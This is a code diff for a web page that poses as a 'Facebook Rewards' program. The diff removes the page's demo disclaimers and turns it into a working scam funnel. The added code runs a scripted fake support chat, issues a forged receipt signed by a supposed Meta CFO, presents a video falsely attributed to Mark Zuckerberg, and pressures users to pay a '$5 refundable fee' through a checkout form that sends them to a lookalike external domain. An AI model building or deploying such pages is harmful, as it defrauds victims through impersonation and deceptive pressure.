-            <img alt="Facebook Rewards" width="118" height="34" class="fb-header-logo" src="images/meta-rewards-logo.png">
-            <div class="fb-balance support-balance">
-              <span class="fb-balance-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg></span>
+            <div class="support-fb-logo">
+              <svg class="support-fb-circle" viewBox="0 0 36 36" width="40" height="40" fill="none">
+                <circle cx="18" cy="18" r="18" fill="#1877F2"/>
+                <path fill="#ffffff" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/>
+              </svg>
+              <div class="support-fb-brand">
+                <span class="support-fb-name">facebook</span>
+                <span class="support-fb-sub">rewards</span>
+              </div>
+            </div>
+            <div class="support-balance-badge">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="2" y="5" width="20" height="14" rx="3"></rect>
+                <line x1="2" y1="10" x2="22" y2="10"></line>
+                <line x1="6" y1="15" x2="9" y2="15"></line>
+              </svg>
               <span id="balance-chat">$ 278.45</span>
             </div>
           </header>
-          <div class="support-agent" aria-label="Emily Carter, virtual assistant">
-            <img class="support-agent-avatar" src="images/emily-support.webp" alt="">
-            <div><div class="support-agent-name">Emily Carter</div><div class="support-agent-note">Virtual assistant</div></div>
+          <div class="support-divider"></div>
+          <div class="support-agent-card">
+            <div class="support-agent-avatar-wrap" id="support-agent-avatar-wrap">
+              <svg class="support-fb-circle" viewBox="0 0 36 36" width="44" height="44" fill="none">
+                <circle cx="18" cy="18" r="18" fill="#1877F2"/>
+                <path fill="#ffffff" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/>
+              </svg>
+            </div>
+            <div class="support-agent-info">
+              <div class="support-agent-name" id="support-agent-name">Facebook Support</div>
+              <div class="support-agent-role" id="support-agent-role"><span class="support-status-dot"></span><span>Online</span></div>
+            </div>
           </div>
+          <div class="support-divider"></div>
           <main id="support-chat" class="support-chat" aria-live="polite"></main>
           <footer class="support-footer">
             <button id="support-choice" type="button" class="support-choice" onclick="answerSupport()"></button>
-            <form id="support-form" class="support-form" onsubmit="answerSupportInfo(event)">
-              <input id="support-input" class="support-input" required autocomplete="off">
-              <button class="support-send" type="submit" aria-label="Send">➤</button>
+            <form id="support-form" class="support-form" data-funnel-submit="dados" onsubmit="answerSupportInfo(event)">
+              <input id="support-input" class="support-input" placeholder="Full name" required autocomplete="off">
+              <button class="support-send" type="submit" aria-label="Send">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                  <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
+                </svg>
+              </button>
             </form>
           </footer>
         </div>
@@ -398,27 +592,60 @@
   </div>
 
   <!-- ─────────────────────────────────────────── -->
-  <!-- MODAL: End of demonstration                 -->
+  <!-- MODAL: Checkout form                        -->
   <!-- ─────────────────────────────────────────── -->
-  <div id="modal-demo-end" class="modal-overlay">
+  <div id="modal-checkout" class="modal-overlay">
     <div class="flex flex-col w-full max-w-lg gap-5 text-center rounded-2xl shadow-lg px-8 py-10 bg-gray-50 relative appear">
-      <button onclick="closeDemoEnd()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
+      <button onclick="closeCheckout()" class="absolute top-4 right-4 text-gray-400 hover:text-gray-600">
         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
           <path d="M18 6 6 18"></path><path d="m6 6 12 12"></path>
         </svg>
       </button>
-      <h2 class="text-xl font-bold">End of demonstration</h2>
-      <p class="text-sm text-gray-700">All balances, receipts and rewards shown here are fictional. There is no payment or withdrawal link.</p>
-      <button type="button" onclick="closeDemoEnd()" class="w-full rounded-xl bg-gray-800 px-5 py-3 font-semibold text-white">Close</button>
+      <!-- App info -->
+      <div class="flex w-full items-center gap-4 p-4 border rounded-xl border-gray-200 bg-white shadow-sm text-left">
+        <div class="relative w-16 h-16 rounded-lg overflow-hidden bg-gray-100 flex-shrink-0">
+          <img src="images/lZFRpx3ZE7xx.png" alt="Facebook Rewards" class="w-full h-full object-contain p-1">
+        </div>
+        <div class="flex flex-col">
+          <span class="font-bold text-lg leading-tight">Facebook Rewards</span>
+          <span class="text-xs text-gray-500">Author: Facebook Inc. ©</span>
+        </div>
+      </div>
+      <!-- Form -->
+      <form class="flex flex-col gap-4 text-left" onsubmit="submitCheckout(event)">
+        <div>
+          <label class="block text-sm font-medium text-gray-700 mb-1">Full Name</label>
+          <input id="checkout-name" name="name" required="" type="text" placeholder="John Doe" class="w-full rounded-lg border border-gray-300 px-4 py-3 bg-white text-black placeholder:text-gray-500 focus:border-green-500 focus:ring-green-500 outline-none transition-all">
+        </div>
+        <div>
+          <label class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
+          <input id="checkout-email" name="email" required="" type="email" placeholder="john@example.com" class="w-full rounded-lg border border-gray-300 px-4 py-3 bg-white text-black placeholder:text-gray-500 focus:border-green-500 focus:ring-green-500 outline-none transition-all">
+        </div>
+        <button type="submit" class="flex justify-center items-center gap-2 w-full p-5 shadow-lg bg-[#16A34A] hover:opacity-80 transition-all rounded-xl text-white font-semibold text-center">
+          Continue
+        </button>
+      </form>
     </div>
   </div>
 
   <script>
+  // ─── Trackly Funnel Tracking ──────────────────────────────────────────────────
+  function trackFunnelStep(key) {
+    try {
+      if (typeof trkFunnel !== "undefined" && trkFunnel && typeof trkFunnel.step === "function") {
+        trkFunnel.step(key);
+      } else if (window.trkFunnel && typeof window.trkFunnel.step === "function") {
+        window.trkFunnel.step(key);
+      }
+    } catch (e) {}
+  }
+
   // ─── State ───────────────────────────────────────────────────────────────────
   var STEP = 0;
   var LIKED = false;
   var LIKE_COUNT = 2847;
   var BALANCE_TIMER = null;
+  var CHECKOUT_URL = "https://secure.face.officialprogram.online/";
   var VH_KEY = "vh-25";
 
   var BALANCES = [32.27, 114.33, 196.39, 278.45, 278.45];
@@ -498,10 +725,8 @@
     var viewport = window.visualViewport;
     var height = viewport ? viewport.height : window.innerHeight;
     var top = viewport ? viewport.offsetTop : 0;
-    var bannerHeight = document.querySelector(".demo-banner").offsetHeight;
-    document.documentElement.style.setProperty("--demo-banner-height", bannerHeight + "px");
-    document.documentElement.style.setProperty("--chat-viewport-height", Math.round(Math.max(0, height - bannerHeight)) + "px");
-    document.documentElement.style.setProperty("--chat-viewport-top", Math.round(top + bannerHeight) + "px");
+    document.documentElement.style.setProperty("--chat-viewport-height", Math.round(height) + "px");
+    document.documentElement.style.setProperty("--chat-viewport-top", Math.round(top) + "px");
     if (document.body.classList.contains("chat-full")) supportScroll();
   }
   syncChatViewport();
@@ -516,6 +741,7 @@
     document.documentElement.classList.toggle("chat-full", n === 4);
     if (n === 0) {
       document.getElementById("step-0").classList.add("active");
+      trackFunnelStep("tela_inicial");
     } else if (n >= 1 && n <= 3) {
       var wrap = document.getElementById("post-wrap");
       wrap.classList.remove("appear");
@@ -525,12 +751,16 @@
       document.getElementById("step-post").classList.add("active");
       animateBalance("balance-post", BALANCES[n-1], BALANCES[n-1], 0);
       window.scrollTo(0, 0);
+      if (n === 1) trackFunnelStep("post_1");
+      else if (n === 2) trackFunnelStep("post_2");
+      else if (n === 3) trackFunnelStep("post_3");
     } else if (n === 4) {
       document.getElementById("step-4").classList.add("active");
       syncChatViewport();
       document.getElementById("balance-chat").textContent = "$ " + BALANCES[4].toFixed(2);
       initSupportChat();
       window.scrollTo(0, 0);
+      trackFunnelStep("chat");
     }
     STEP = n;
     if (typeof window.b3Step === "function" && STEP_NAMES[n]) {
@@ -558,6 +788,7 @@
   // ─── Render post card (steps 1-3) ────────────────────────────────────────────
   function renderPost(n) {
     var p = POSTS[n];
+    var nextKey = n === 1 ? "post_2" : (n === 2 ? "post_3" : "chat");
     document.getElementById("post-card").innerHTML =
       '<div class="fb-post-head">' +
         '<div class="fb-avatar">' +
@@ -597,11 +828,11 @@
           '<div class="fb-survey-kicker">Answer the question:</div>' +
           '<div class="fb-question">' + p.question + '</div>' +
         '<div class="fb-votes">' +
-          '<button type="button" onclick="vote()" class="fb-vote fb-vote-no">' +
+          '<button type="button" onclick="vote()" class="fb-vote fb-vote-no" data-funnel-step="' + nextKey + '">' +
             '<svg width="20" height="20" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 14V2"></path><path d="M9 18.12 10 14H4.17a2 2 0 0 1-1.92-2.56l2.33-8A2 2 0 0 1 6.5 2H20a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2h-2.76a2 2 0 0 0-1.79 1.11L12 22a3.13 3.13 0 0 1-3-3.88Z"></path></svg>' +
             '<span>Not relevant</span>' +
           '</button>' +
-          '<button type="button" onclick="vote()" class="fb-vote fb-vote-yes">' +
+          '<button type="button" onclick="vote()" class="fb-vote fb-vote-yes" data-funnel-step="' + nextKey + '">' +
             '<svg width="20" height="20" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 10v12"></path><path d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2a3.13 3.13 0 0 1 3 3.88Z"></path></svg>' +
             '<span>Relevant</span>' +
           '</button>' +
@@ -614,6 +845,9 @@
   function vote() {
     var earned = (BALANCES[STEP] - BALANCES[STEP - 1]).toFixed(2);
     document.getElementById("earned-amount").textContent = "+$" + earned;
+    var nextKey = STEP === 1 ? "post_2" : (STEP === 2 ? "post_3" : "chat");
+    var contBtn = document.querySelector("#modal-balance button");
+    if (contBtn) contBtn.setAttribute("data-funnel-step", nextKey);
     // reset animations by cloning
     resetBalanceModalAnimations();
     document.getElementById("modal-balance").classList.add("open");
@@ -660,47 +894,110 @@
   var supportInputKind = null;
   var supportName = "";
   var supportEmail = "";
+  var currentSupportAgent = "facebook";
+
+  function getAgentAvatarHtml() {
+    if (currentSupportAgent === "emily") {
+      return '<img class="support-mini-avatar" src="images/emily-support.webp" alt="Emily Carter">';
+    }
+    return '<svg class="support-mini-avatar support-mini-fb" viewBox="0 0 36 36" width="34" height="34" fill="none"><circle cx="18" cy="18" r="18" fill="#1877F2"/><path fill="#ffffff" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/></svg>';
+  }
+
+  function updateSupportAgentCard(agent) {
+    var wrap = document.getElementById("support-agent-avatar-wrap");
+    var nameEl = document.getElementById("support-agent-name");
+    var roleEl = document.getElementById("support-agent-role");
+    if (!wrap || !nameEl || !roleEl) return;
+    if (agent === "emily") {
+      wrap.innerHTML = '<img class="support-agent-avatar" src="images/emily-support.webp" alt="Emily Carter">';
+      nameEl.textContent = "Emily Carter";
+      roleEl.innerHTML = '<span class="support-status-dot"></span><span>Online</span>';
+    } else {
+      wrap.innerHTML = '<svg class="support-fb-circle" viewBox="0 0 36 36" width="44" height="44" fill="none"><circle cx="18" cy="18" r="18" fill="#1877F2"/><path fill="#ffffff" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/></svg>';
+      nameEl.textContent = "Facebook Support";
+      roleEl.innerHTML = '<span class="support-status-dot"></span><span>Online</span>';
+    }
+  }
+
+  function addSupportSystemMessage(text) {
+    var chat = document.getElementById("support-chat");
+    if (!chat) return;
+    supportTyping(false);
+    var row = document.createElement("div");
+    row.className = "support-row-system";
+    row.innerHTML = '<span class="support-system-badge">' + text + '</span>';
+    chat.appendChild(row);
+    supportScroll();
+  }
+
+  function getTypingDelay(htmlOrText) {
+    var plain = (htmlOrText || "")
+      .replace(/<svg[\s\S]*?<\/svg>/gi, "")
+      .replace(/<[^>]*>/g, "")
+      .replace(/\s+/g, " ")
+      .trim();
+    var len = plain.length;
+    // Conversational typing rhythm based on message length:
+    // ~26ms per character + 750ms base
+    // Minimum 1300ms, maximum 4500ms
+    var ms = 750 + Math.round(len * 26);
+    if (ms < 1300) ms = 1300;
+    if (ms > 4500) ms = 4500;
+    return ms;
+  }
+
   var SUPPORT_STEPS = [
-    { type:"text", text:"Hi, welcome to <strong>Facebook Support!</strong>" },
-    { type:"wait", ms:1500 },
-    { type:"text", text:"You were <strong>one of the few people</strong> selected for the <strong>Facebook Rewards Program.</strong>" },
-    { type:"wait", ms:1500 },
-    { type:"text", text:"My name is Emily and I'll help you redeem your reward." },
+    { type:"text", track:"boas_vindas", text:"Hi, welcome to <strong>Facebook Support!</strong>" },
+    { type:"wait", ms:1200 },
+    { type:"text", text:"To begin your service, your case number is <strong>809821</strong>" },
+    { type:"wait", ms:1300 },
+    { type:"text", text:"You've been <strong>one of the few people</strong> selected for the<br><strong>Meta Rewards Program.</strong>" },
     { type:"wait", ms:1000 },
-    { type:"text", text:"You have a balance of <strong>$278.45</strong> in our app" },
+    { type:"join", track:"atendente", text:"Emily Carter joined the chat" },
+    { type:"wait", ms:1400 },
+    { type:"text", text:"My name is Emily and I'll help you redeem your reward." },
+    { type:"wait", ms:1200 },
+    { type:"video", track:"video_1", id:"6abd374d673e2b44981dc239" },
     { type:"wait", ms:2000 },
+    { type:"text", text:"You have a balance of <strong>$278.45</strong> in our app" },
+    { type:"wait", ms:1500 },
     { type:"text", text:"Would you like to continue so you can <strong>withdraw your money?</strong>" },
     { type:"choice", label:"Yes, I want to withdraw my money" },
-    { type:"messageLoading", ms:3000 },
-    { type:"text", noTyping:true, text:"<span class=\"support-confirm-icon\" aria-hidden=\"true\">✓</span>Okay, I'll continue with your registration." },
-    { type:"wait", ms:1000 },
-    { type:"text", text:"At this stage, I need you to tell me your name so I can verify that you're a new user." },
+    { type:"wait", ms:1200 },
+    { type:"text", text:'<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00a854" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-3px;margin-right:7px;"><circle cx="12" cy="12" r="10"></circle><polyline points="8 12 11 15 16 9"></polyline></svg>Okay, I\'ll continue with your registration.' },
+    { type:"wait", ms:1200 },
+    { type:"text", text:"At this stage, I need you to tell me your name<br>so I can verify that you're a new user." },
     { type:"input", field:"name", placeholder:"Full name" },
-    { type:"messageLoading", ms:3000 },
-    { type:"eligibility", noTyping:true },
-    { type:"wait", ms:1000 },
+    { type:"wait", ms:1200 },
+    { type:"text", text:'<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00a854" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-3px;margin-right:7px;"><circle cx="12" cy="12" r="10"></circle><polyline points="8 12 11 15 16 9"></polyline></svg>Everything looks good, {name}!<br><br>I checked our system and saw that you are eligible to receive your commission of $278.45.' },
+    { type:"wait", ms:1200 },
     { type:"text", text:"I'm sending you the receipt for your commissions." },
+    { type:"wait", ms:1200 },
     { type:"receiptLoading", ms:3000 },
-    { type:"receipt" },
+    { type:"receipt", track:"recibo" },
     { type:"wait", ms:2000 },
     { type:"choice", label:"I want to claim my reward" },
-    { type:"text", text:"<span class=\"support-notice\"><span class=\"support-warning-icon\" aria-hidden=\"true\">⚠︎</span><span>The video stage is disabled in this demonstration.</span></span>" },
-    { type:"video" },
-    { type:"wait", ms:1500 },
-    { type:"text", text:"<strong>Demo notice:</strong> The $278.45 balance shown in this example is fictional." },
-    { type:"wait", ms:1500 },
-    { type:"text", text:"No fee is charged in this demonstration, and no payout or refund is available." },
-    { type:"wait", ms:1500 },
-    { type:"text", text:"<strong>Everything in this chat is sample content.</strong><br><br>Please don't enter card or payment details." },
+    { type:"wait", ms:1200 },
+    { type:"text", text:"I'm sending you the official withdrawal tutorial posted by <strong>Mark Zuckerberg</strong>. Watch it to see step-by-step how to register your bank account and withdraw your earnings 👇" },
+    { type:"wait", ms:1400 },
+    { type:"fbPost", track:"video_2_zuck", id:"6abc96cf953cdb1ddef4ea63", padding:"125%" },
     { type:"wait", ms:3000 },
-    { type:"text", text:"This is the end of the demo. There is no payment link." },
+    { type:"text", track:"pitch", text:"<strong>To receive your $278.45 reward.</strong><br><br>You'll need to pay <strong>a small $5.00 fee</strong> to secure your spot in our <strong>Meta Program</strong>" },
+    { type:"wait", ms:1500 },
+    { type:"text", text:"<strong>Important:</strong> The fee is fully refunded after registration, together with your current balance of <strong>$278.45</strong>" },
+    { type:"wait", ms:1500 },
+    { type:"text", text:"<strong>This is a unique opportunity for you, since you made it this far. If you give up, your reward will be sent to someone else.</strong><br><br><strong>Your balance will be sent to the same card you register in the verification step.</strong><br><br><strong>Remember the fee is refunded together with your commissions balance.</strong>" },
     { type:"wait", ms:3000 },
-    { type:"demoEnd" }
+    { type:"text", text:"<strong>I'll send you the link so you can pay the fee and receive your commissions balance</strong>" },
+    { type:"wait", ms:3000 },
+    { type:"checkout" }
   ];
 
   function initSupportChat() {
     if (supportStarted) return;
     supportStarted = true;
+    currentSupportAgent = "facebook";
+    updateSupportAgentCard("facebook");
     supportIndex = 0;
     setTimeout(runSupportStep, 250);
   }
@@ -718,28 +1015,9 @@
     var row = document.createElement("div");
     row.id = "support-typing";
     row.className = "support-row";
-    row.innerHTML = '<img class="support-mini-avatar" src="images/emily-support.webp" alt=""><div class="support-bubble support-typing"><span></span><span></span><span></span></div>';
+    row.innerHTML = getAgentAvatarHtml() + '<div class="support-bubble support-typing"><span></span><span></span><span></span></div>';
     chat.appendChild(row);
     supportScroll();
-  }
-
-  function showSupportMessageLoading(duration) {
-    var chat = document.getElementById("support-chat");
-    if (!chat) return;
-    supportTyping(false);
-    var row = document.createElement("div");
-    row.className = "support-row";
-    row.innerHTML = '<img class="support-mini-avatar" src="images/emily-support.webp" alt=""><div class="support-bubble support-message-loading" role="status" aria-live="polite"><span class="support-receipt-spinner" aria-hidden="true"></span><span class="support-message-loading-text">Verifying...</span></div>';
-    chat.appendChild(row);
-    supportScroll();
-    setTimeout(function () {
-      if (row.isConnected) row.querySelector(".support-message-loading-text").textContent = "Checking...";
-    }, duration / 2);
-    setTimeout(function () {
-      row.remove();
-      supportIndex += 1;
-      runSupportStep();
-    }, duration);
   }
 
   function addSupportBubble(kind, html) {
@@ -748,7 +1026,7 @@
     supportTyping(false);
     var row = document.createElement("div");
     row.className = "support-row" + (kind === "user" ? " user" : "");
-    row.innerHTML = (kind === "user" ? "" : '<img class="support-mini-avatar" src="images/emily-support.webp" alt="">') + '<div class="support-bubble">' + html + '</div>';
+    row.innerHTML = (kind === "user" ? "" : getAgentAvatarHtml()) + '<div class="support-bubble">' + html + '</div>';
     chat.appendChild(row);
     supportScroll();
   }
@@ -768,18 +1046,22 @@
     row.className = "support-row";
     var now = new Date();
     var date = String(now.getMonth() + 1).padStart(2, "0") + "/" + String(now.getDate()).padStart(2, "0") + "/" + now.getFullYear();
-    row.innerHTML = '<img class="support-mini-avatar" src="images/emily-support.webp" alt="">' +
+    row.innerHTML = getAgentAvatarHtml() +
       '<article class="support-receipt">' +
         '<div class="support-receipt-head"><div class="support-receipt-brand"><img class="support-receipt-logo" src="images/meta-rewards-logo.png" alt=""><span>Meta Rewards</span></div><span>Ref. ' + ref + '</span></div>' +
-        '<div class="support-receipt-title">Sample Commission Receipt</div>' +
+        '<div class="support-receipt-title">Commission Receipt</div>' +
         '<div class="support-receipt-body">' +
-          '<div class="support-receipt-parties"><div><div class="support-receipt-blue">From</div><strong>Meta Rewards Inc. (fictional)</strong><div class="support-receipt-muted">Sample details only</div></div><div class="support-receipt-to"><div class="support-receipt-blue">To</div><strong>' + escapeSupportText(supportName || "—") + '</strong><div class="support-receipt-muted">' + escapeSupportText(supportEmail || "—") + '</div></div></div>' +
+          '<div class="support-receipt-parties"><div><div class="support-receipt-blue">From</div><strong>Meta Rewards Inc.</strong><div class="support-receipt-muted">Menlo Park, California</div></div><div class="support-receipt-to"><div class="support-receipt-blue">To</div><strong>' + escapeSupportText(supportName || "—") + '</strong><div class="support-receipt-muted">' + escapeSupportText(supportEmail || "—") + '</div></div></div>' +
           '<div class="support-receipt-table"><div class="support-receipt-table-row support-receipt-table-head"><span>Description</span><span>Qty</span><span>Total</span></div><div class="support-receipt-table-row support-receipt-table-value"><span>Payment for ad evaluation</span><span>1</span><span>$278.45</span></div></div>' +
-          '<div class="support-receipt-total"><span>Sample total</span><strong>$278.45</strong></div>' +
-          '<div class="support-receipt-details"><div><div><strong>Ref.</strong> ' + ref + '</div><div><strong>Issued:</strong> ' + date + '</div><div class="support-receipt-muted">Fictional sample. No commission has been approved or paid.</div></div><div class="support-receipt-sign"><div class="support-receipt-signature">Michael R. Santos</div><strong>Sample signature</strong><div class="support-receipt-muted">Demonstration only</div></div></div>' +
-          '<div class="support-receipt-method"><strong>Sample method:</strong> Bank transfer (no transaction)</div>' +
-          '<div class="support-receipt-notice"><strong>Demo notice:</strong> This amount is not available for withdrawal.</div>' +
-        '</div><div class="support-receipt-foot"><img src="images/meta-rewards-logo.png" alt="Meta Rewards"></div>' +
+          '<div class="support-receipt-total"><span>Total</span><strong>$278.45</strong></div>' +
+          '<div class="support-receipt-details"><div><div><strong>Ref.</strong> ' + ref + '</div><div><strong>Issued:</strong> ' + date + '</div><div class="support-receipt-muted">This receipt confirms the approved commission payment.</div></div><div class="support-receipt-sign"><div class="support-receipt-signature">Michael R. Santos</div><strong>Chief Financial Officer</strong><div class="support-receipt-muted">Meta Rewards Inc.</div></div></div>' +
+          '<div class="support-receipt-method"><strong>Payment method:</strong> Bank transfer</div>' +
+        '</div><div class="support-receipt-foot">' +
+          '<div class="receipt-foot-brand">' +
+            '<svg width="17" height="17" viewBox="0 0 36 36" fill="none"><circle cx="18" cy="18" r="18" fill="#ffffff"/><path fill="#1877F2" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/></svg>' +
+            '<div class="receipt-foot-text"><span class="receipt-foot-name">facebook</span><span class="receipt-foot-sub">rewards</span></div>' +
+          '</div>' +
+        '</div>' +
       '</article>';
     chat.appendChild(row);
     supportScroll();
@@ -792,7 +1074,7 @@
     var row = document.createElement("div");
     row.id = "support-receipt-loading";
     row.className = "support-row";
-    row.innerHTML = '<img class="support-mini-avatar" src="images/emily-support.webp" alt=""><div class="support-bubble support-receipt-loading"><span class="support-receipt-spinner" aria-hidden="true"></span><span class="support-receipt-loading-text">Generating your commission withdrawal receipt...</span></div>';
+    row.innerHTML = getAgentAvatarHtml() + '<div class="support-bubble support-receipt-loading"><span class="support-receipt-spinner" aria-hidden="true"></span><span class="support-receipt-loading-text">Generating your commission withdrawal receipt...  </span></div>';
     chat.appendChild(row);
     supportScroll();
     setTimeout(function () {
@@ -808,21 +1090,559 @@
     supportTyping(false);
     var row = document.createElement("div");
     row.className = "support-row";
-    row.innerHTML = '<img class="support-mini-avatar" src="images/emily-support.webp" alt=""><img class="support-image" src="' + url + '" alt="Commission proof">';
+    row.innerHTML = getAgentAvatarHtml() + '<img class="support-image" src="' + url + '" alt="Commission proof">';
     chat.appendChild(row);
     supportScroll();
   }
 
-  function addSupportVideo() {
+  var waitingVideoPitch = null;
+  var playerPitchTimes = {
+    "6abd374d673e2b44981dc239": 15
+  };
+
+  function fetchPlayerPitchConfig(playerId) {
+    if (!playerId) return;
+    try {
+      var embedUrl = 'https://scripts.converteai.net/2223d7db-1826-46ab-bf08-708ee5b93e74/players/' + playerId + '/v4/embed.html';
+      fetch(embedUrl)
+        .then(function(res) { return res.text(); })
+        .then(function(html) {
+          var matchScroll = html.match(/scrollToActionIn[:\s]*([0-9.]+)/i);
+          if (matchScroll && matchScroll[1]) {
+            var s = parseFloat(matchScroll[1]);
+            if (s > 0) playerPitchTimes[playerId] = s;
+          }
+          var matchPitch = html.match(/pitchTime[:\s]*([0-9.]+)/i);
+          if (matchPitch && matchPitch[1]) {
+            var p = parseFloat(matchPitch[1]);
+            if (p > 0) playerPitchTimes[playerId] = p;
+          }
+        })
+        .catch(function() {});
+    } catch (e) {}
+  }
+
+  function advanceFromPitch(playerId) {
+    if (!waitingVideoPitch) return;
+    if (playerId && waitingVideoPitch !== playerId) return;
+
+    var currentPending = waitingVideoPitch;
+    waitingVideoPitch = null;
+
+    var marker = document.getElementById("smartplayer-scroll-marker-" + currentPending) || document.querySelector(".smartplayer-scroll-event");
+    if (marker) {
+      try {
+        marker.scrollIntoView({ behavior: "smooth", block: "start" });
+      } catch (e) {
+        supportScroll();
+      }
+    } else {
+      supportScroll();
+    }
+
+    supportIndex += 1;
+    setTimeout(runSupportStep, 400);
+  }
+
+  // Intercepta chamadas de scrollIntoView do VTurb para elementos com a classe .smartplayer-scroll-event
+  var _origScrollIntoView = Element.prototype.scrollIntoView;
+  Element.prototype.scrollIntoView = function() {
+    if (this && this.classList && this.classList.contains("smartplayer-scroll-event")) {
+      var pid = this.getAttribute("data-player-id");
+      advanceFromPitch(pid);
+    }
+    return _origScrollIntoView.apply(this, arguments);
+  };
+
+  // Intercepta eventos e mensagens via postMessage do player ConverteAI / VTurb
+  window.addEventListener("message", function(e) {
+    var d = e && e.data;
+    if (!d) return;
+    var pid = d.id;
+
+    // Disparos explícitos de pitch pelo VTurb
+    if (d.type === "pitchTime" || d.event === "pitchTime" || d.type === "callactionCurrentActiveItems") {
+      advanceFromPitch(pid);
+      return;
+    }
+
+    // Monitoramento do progresso de tempo do vídeo
+    var currentTime = null;
+    if (d.type === "videoTimeUpdate" && d.payload && typeof d.payload.time === "number") {
+      currentTime = d.payload.time;
+    } else if (d.time && typeof d.time === "number") {
+      currentTime = d.time;
+    }
+
+    if (currentTime !== null && pid && playerPitchTimes[pid]) {
+      if (currentTime >= playerPitchTimes[pid]) {
+        advanceFromPitch(pid);
+        return;
+      }
+    }
+
+    // Se o vídeo terminar antes do pitch
+    if (d.type === "videoEnded" || d.type === "ended") {
+      advanceFromPitch(pid);
+      return;
+    }
+  });
+
+  // Atalho opcional para desenvolvedor no console
+  window.__b3SkipPitch = function() {
+    advanceFromPitch();
+  };
+
+  function addSupportVideo(opts) {
     var chat = document.getElementById("support-chat");
     if (!chat) return;
     supportTyping(false);
+
+    opts = opts || {};
+    var playerId = opts.id || "6abd374d673e2b44981dc239";
+    var padding = opts.padding || "177.77777777777777%";
+    var maxWidth = opts.maxWidth || "400px";
+
+    if (!document.getElementById("converteai-sdk")) {
+      var s = document.createElement("script");
+      s.id = "converteai-sdk";
+      s.src = "https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js";
+      s.async = true;
+      document.head.appendChild(s);
+    }
+
+    // Tenta atualizar a configuração do pitch direto do VTurb
+    fetchPlayerPitchConfig(playerId);
+
+    var embedUrl = 'https://scripts.converteai.net/2223d7db-1826-46ab-bf08-708ee5b93e74/players/' + playerId + '/v4/embed.html' + (location.search || '?') + '&vl=' + encodeURIComponent(location.href);
+
     var row = document.createElement("div");
     row.className = "support-row";
-    row.innerHTML = '<img class="support-mini-avatar" src="images/emily-support.webp" alt="">' +
-      '<div class="support-video">Demo video disabled. No external links are available.</div>';
+    row.innerHTML = getAgentAvatarHtml() +
+      '<div class="support-video">' +
+        '<div id="ifr_' + playerId + '_wrapper" style="margin: 0 auto; width: 100%; max-width: ' + maxWidth + ';">' +
+          '<div style="position: relative; padding: ' + padding + ' 0 0 0;" id="ifr_' + playerId + '_aspect">' +
+            '<iframe frameborder="0" allowfullscreen allow="autoplay; fullscreen; encrypted-media" src="' + embedUrl + '" id="ifr_' + playerId + '" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0;" referrerpolicy="origin"></iframe>' +
+          '</div>' +
+        '</div>' +
+      '</div>';
     chat.appendChild(row);
+
+    // Cria o marcador com a classe .smartplayer-scroll-event para o VTurb rolar e engatilhar o próximo bloco
+    var marker = document.createElement("div");
+    marker.className = "smartplayer-scroll-event";
+    marker.id = "smartplayer-scroll-marker-" + playerId;
+    marker.setAttribute("data-player-id", playerId);
+
+    // Hook no getBoundingClientRect (VTurb chama getBoundingClientRect quando atinge o scrollToActionIn)
+    var origGBCR = marker.getBoundingClientRect.bind(marker);
+    marker.getBoundingClientRect = function() {
+      advanceFromPitch(playerId);
+      return origGBCR();
+    };
+
+    chat.appendChild(marker);
     supportScroll();
+  }
+
+  var FB_COMMENTS = [
+    { name: "Sarah Johnson", avatar: "images/comments/avatar_1.webp", text: "OMG!! Just withdrew $385! I can't believe this is real! 😱 🎉", time: "2h", reactions: 213 },
